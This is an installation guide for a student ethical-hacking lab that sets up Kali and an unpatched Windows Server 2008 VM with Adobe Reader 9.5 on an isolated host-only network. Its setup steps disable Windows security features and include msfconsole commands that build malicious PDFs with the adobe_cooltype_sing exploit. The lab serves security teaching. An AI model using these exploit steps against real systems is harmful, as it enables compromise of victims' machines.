# Installation Guide
## Ethical Hacking PDF Exploit Lab

Complete step-by-step installation instructions.

---

## Table of Contents

1. [System Requirements](#system-requirements)
2. [Pre-Installation](#pre-installation)
3. [Installing Prerequisites](#installing-prerequisites)
4. [Lab Installation](#lab-installation)
5. [Verification](#verification)
6. [Manual Installation](#manual-installation)

---

## System Requirements

### Minimum Requirements

| Component | Requirement |
|-----------|-------------|
| **OS** | Windows 10/11, macOS 10.15+, Ubuntu 20.04+ |
| **CPU** | Intel VT-x or AMD-V capable processor |
| **RAM** | 8 GB |
| **Disk** | 40 GB free space |
| **Network** | Internet connection for initial setup |

### Recommended Requirements

| Component | Recommendation |
|-----------|----------------|
| **RAM** | 16 GB or more |
| **CPU** | 4+ cores |
| **Disk** | SSD with 60+ GB free |
| **Network** | Wired connection (faster downloads) |

---

## Pre-Installation

### 1. Enable Virtualization

**Check if enabled:**

**Linux:**
```bash
egrep -c '(vmx|svm)' /proc/cpuinfo
# Output > 0 = enabled
```

**macOS:**
```bash
sysctl -a | grep machdep.cpu.features | grep VMX
# Should show VMX
```

**Windows:**
```powershell
systeminfo | findstr /i "Hyper-V"
# Should show "Yes" or virtualization enabled
```

**If not enabled:**
- Reboot computer
- Enter BIOS/UEFI (usually F2, F10, or DEL during boot)
- Find "Virtualization Technology" or "VT-x" or "AMD-V"
- Enable it
- Save and reboot

---

### 2. Disable Hyper-V (Windows Only)

If using Windows, Hyper-V must be disabled for VirtualBox to work:

```powershell
# Run as Administrator
bcdedit /set hypervisorlaunchtype off
```

Reboot computer.

---

### 3. Free Up Disk Space

Ensure you have at least 40GB free:

**Linux/macOS:**
```bash
df -h
```

**Windows:**
```powershell
Get-PSDrive C
```

**If needed, clean up:**
- Remove old downloads
- Uninstall unused applications
- Empty trash/recycle bin
- Run disk cleanup utility

---

## Installing Prerequisites

### Windows

#### 1. Install VirtualBox

1. Download from: https://www.virtualbox.org/wiki/Downloads
2. Choose: "Windows hosts"
3. Run installer (VirtualBox-x.x.xx-xxxxx-Win.exe)
4. Accept defaults, click "Install"
5. Allow driver installation prompts
6. Reboot if prompted

**Verify:**
```powershell
"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" --version
```

#### 2. Install Vagrant

1. Download from: https://www.vagrantup.com/downloads
2. Choose: "Windows 64-bit"
3. Run installer (vagrant_x.x.x_x86_64.msi)
4. Accept defaults, click "Install"
5. Restart terminal

**Verify:**
```powershell
vagrant --version
```

#### 3. Install Git (for cloning repository)

1. Download from: https://git-scm.com/download/win
2. Run installer
3. Accept defaults

**Verify:**
```powershell
git --version
```

---

### macOS

#### 1. Install Homebrew (if not installed)

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

#### 2. Install VirtualBox

**Option A: Homebrew (recommended)**
```bash
brew install --cask virtualbox
```

**Option B: Manual**
1. Download from: https://www.virtualbox.org/wiki/Downloads
2. Choose: "macOS / Intel hosts"
3. Open .dmg file
4. Run VirtualBox.pkg
5. Go to System Preferences > Security & Privacy
6. Click "Allow" for Oracle systems extension
7. Reboot

**Verify:**
```bash
VBoxManage --version
```

#### 3. Install Vagrant

**Option A: Homebrew (recommended)**
```bash
brew install --cask vagrant
```

**Option B: Manual**
1. Download from: https://www.vagrantup.com/downloads
2. Choose: "macOS"
3. Open .dmg file
4. Run vagrant.pkg

**Verify:**
```bash
vagrant --version
```

---

### Linux (Ubuntu/Debian)

#### 1. Install VirtualBox

```bash
# Update package list
sudo apt update

# Install VirtualBox
sudo apt install virtualbox virtualbox-ext-pack

# Add your user to vboxusers group
sudo usermod -aG vboxusers $USER

# Reboot (or log out and back in)
sudo reboot
```

**Verify:**
```bash
VBoxManage --version
```

#### 2. Install Vagrant

**Option A: From HashiCorp (recommended)**
```bash
# Add HashiCorp GPG key
wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg

# Add repository
echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list

# Install
sudo apt update
sudo apt install vagrant
```

**Option B: From Ubuntu repos (older version)**
```bash
sudo apt install vagrant
```

**Verify:**
```bash
vagrant --version
```

#### 3. Install Git (usually pre-installed)

```bash
sudo apt install git
```

---

### Linux (Fedora/RHEL/CentOS)

#### 1. Install VirtualBox

```bash
# Add VirtualBox repository
sudo dnf install wget
wget https://download.virtualbox.org/virtualbox/rpm/fedora/virtualbox.repo
sudo mv virtualbox.repo /etc/yum.repos.d/

# Install VirtualBox
sudo dnf install VirtualBox-7.0

# Add user to group
sudo usermod -aG vboxusers $USER
sudo reboot
```

#### 2. Install Vagrant

```bash
# Add HashiCorp repository
sudo dnf install -y dnf-plugins-core
sudo dnf config-manager --add-repo https://rpm.releases.hashicorp.com/fedora/hashicorp.repo

# Install
sudo dnf install vagrant
```

**Verify:**
```bash
vagrant --version
```

---

## Lab Installation

### Quick Installation (Recommended)

```bash
# 1. Clone repository
git clone https://github.com/gcheliz/ethical-hacking-student-lab.git
cd ethical-hacking-student-lab

# 2. Run automated setup
./setup.sh
```

**Wait 15-30 minutes** for complete setup.

---

### What the Setup Script Does

The `setup.sh` script automatically:

1. ✅ Checks prerequisites (VirtualBox, Vagrant, disk space)
2. ✅ Downloads Adobe Reader 9.5.0 installer (~50MB)
3. ✅ Configures VirtualBox host-only network (192.168.56.0/24)
4. ✅ Downloads Kali Linux box (~3GB)
5. ✅ Provisions Kali VM with Metasploit
6. ✅ Downloads Windows Server 2008 R2 box (~6GB)
7. ✅ Installs Adobe Reader on Windows
8. ✅ Disables all Windows security features
9. ✅ Generates malicious PDF files
10. ✅ Creates VM snapshots for easy reset
11. ✅ Verifies network connectivity

**Total download:** ~10GB
**Total disk usage:** ~30GB (with VMs running)

---

## Verification

### Check Installation Success

```bash
cd vagrant
vagrant status
```

**Expected output:**
```
Current machine states:

kali                      running (virtualbox)
win2k8                    running (virtualbox)
```

### Test Network Connectivity

```bash
# SSH into Kali
vagrant ssh kali

# Ping Windows
ping -c 3 192.168.56.102

# Exit
exit
```

**Expected output:**
```
3 packets transmitted, 3 received, 0% packet loss
```

### Verify PDFs Created

```bash
vagrant ssh kali
ls -lh ~/.msf4/local/*.pdf
```

**Expected output:**
```
-rw-r--r-- 1 vagrant vagrant 45K ... JOAN-ESPINACH-TRD.pdf
-rw-r--r-- 1 vagrant vagrant 42K ... JOAN-ESPINACH-ALT.pdf
```

---

## Manual Installation

If automated setup fails, follow these manual steps:

### Step 1: Create Directory Structure

```bash
mkdir -p vagrant/provisioning/{kali,windows}
mkdir -p {exploits,resources,docs,scripts}
```

### Step 2: Download Adobe Reader Manually

1. Visit: https://archive.org/download/adobe-reader-9.5/AdbeRdr950_en_US.exe
2. Save to: `resources/AdobeReader_9.5.exe`
3. Verify size: ~50MB

### Step 3: Configure VirtualBox Network

```bash
# Create host-only network
VBoxManage hostonlyif create

# Configure network
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0

# Verify
VBoxManage list hostonlyifs
```

### Step 4: Start VMs Manually

```bash
cd vagrant

# Start Kali
vagrant up kali

# Wait for completion, then start Windows
vagrant up win2k8
```

### Step 5: Generate PDFs Manually

```bash
vagrant ssh kali

msfconsole
use exploit/windows/fileformat/adobe_cooltype_sing
set LHOST 192.168.56.101
set LPORT 4444
set FILENAME JOAN-ESPINACH-TRD.pdf
exploit
exit
```

---

## Post-Installation

### Create Snapshots

```bash
# Get VM names
KALI_VM=$(VBoxManage list vms | grep kali | awk '{print $1}' | tr -d '"')
WIN_VM=$(VBoxManage list vms | grep win2k8 | awk '{print $1}' | tr -d '"')

# Create snapshots
VBoxManage snapshot "$KALI_VM" take "Clean_State"
VBoxManage snapshot "$WIN_VM" take "Clean_State"
```

### Optimize Performance

**Reduce CPU usage:**
```bash
cd vagrant
vagrant halt

# Edit Vagrantfile, reduce CPUs:
# vb.cpus = 1

vagrant up
```

**Use headless mode for Kali:**
```ruby
# In Vagrantfile for Kali:
vb.gui = false
```

---

## Uninstallation

### Complete Removal

```bash
# 1. Destroy VMs
cd vagrant
vagrant destroy -f

# 2. Remove boxes
vagrant box remove kalilinux/rolling
vagrant box remove rapid7/metasploitable3-win2k8

# 3. Remove repository
cd ../..
rm -rf ethical-hacking-pdf-lab

# 4. (Optional) Uninstall VirtualBox and Vagrant
# Follow OS-specific uninstall procedures
```

---

## Troubleshooting Installation

### Setup Script Fails

**View detailed output:**
```bash
bash -x ./setup.sh 2>&1 | tee setup.log
```

**Check specific step:**
```bash
# Test VirtualBox
VBoxManage --version

# Test Vagrant
vagrant version

# Test disk space
df -h
```

### Download Issues

**Slow downloads:**
- Use wired connection
- Download during off-peak hours
- Consider downloading Vagrant boxes separately

**Failed downloads:**
```bash
# Download boxes manually
vagrant box add kalilinux/rolling
vagrant box add rapid7/metasploitable3-win2k8

# Then run setup
./setup.sh
```

---

## Alternative Installation Methods

### Using Pre-built VMs

If you have slow internet, consider:
1. Download VMs on campus network
2. Export and share with classmates
3. Import existing .ova files

### Cloud-Based Alternative

For M1/M2 Macs or resource-constrained systems:
- Consider AWS/Azure VMs
- Use GitHub Codespaces
- Remote lab access (if provided)

---

## Next Steps

After successful installation:

1. Read `docs/QUICK_START.md` for quick demo
2. Review `docs/LAB_GUIDE.pdf` for full instructions
3. Check `docs/LEARNING_OBJECTIVES.md` for goals
4. Start with first exploit demonstration

---

**Installation complete! Ready to start hacking ethically! 🎯**
